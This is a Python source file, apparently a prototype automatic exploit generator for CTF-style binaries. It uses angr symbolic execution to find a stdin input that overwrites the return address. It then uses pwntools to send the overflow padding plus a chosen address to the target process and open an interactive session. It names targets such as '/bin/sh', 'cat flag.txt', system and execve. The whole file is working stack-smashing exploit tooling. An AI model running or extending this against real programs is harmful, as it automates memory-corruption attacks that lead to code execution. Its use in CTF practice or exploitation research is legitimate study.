import angr
import claripy
import os
import logging
import argparse

from pwn import *


class rAEG:
    def __init__(self, binary_path):
        self.binary = binary_path
        self.elf = ELF(binary_path)

        self.strings =  ['/bin/sh', '/bin/cat flag.txt', 'flag.txt']
        self.exploit_functions = ['win', 'system', 'execve', 'syscall']

        self.proj = angr.Project(binary_path, load_options={'auto_load_libs':False})
        self.loader = self.proj.loader
        start_addr = self.loader.find_symbol('main').rebased_addr


        self.symbolic_input = claripy.BVS("input", 8 * 600)

        self.state = self.proj.factory.blank_state(
                addr=start_addr,
                stdin=self.symbolic_input
        )
        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
        self.simgr.stashes['mem_corrupt'] = []




    def check_mem_corruption(self, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCCCCCC"]):
                    path.add_constraints(path.regs.pc == b"CCCCCCCC")

                    if path.satisfiable():
                        simgr.stashes['mem_corrupt'].append(path)
                        stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
                        print(stack_smash)
                        index = stack_smash.index(b'CCCCCCCC')
                        self.symbolic_buffer = stack_smash[:index]
                        print(self.symbolic_buffer)
                        print(len(self.symbolic_buffer))
                    simgr.stashes['unconstrained'].remove(path)
                    simgr.drop(stash='active')

        return simgr

    def stack_smash(self):
        self.simgr.explore(step_func=self.check_mem_corruption)
        p = process(self.binary)

        fini = p64(self.elf.sym['_fini'])
        main = p64(self.elf.sym['main'])
        #win = p64(self.elf.sym['win'])
        p.sendline(self.symbolic_buffer +  main)
        p.interactive()

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("bin", help="path of binary to exploit")
    args = parser.parse_args()

    solver = rAEG(args.bin)
    solver.stack_smash()
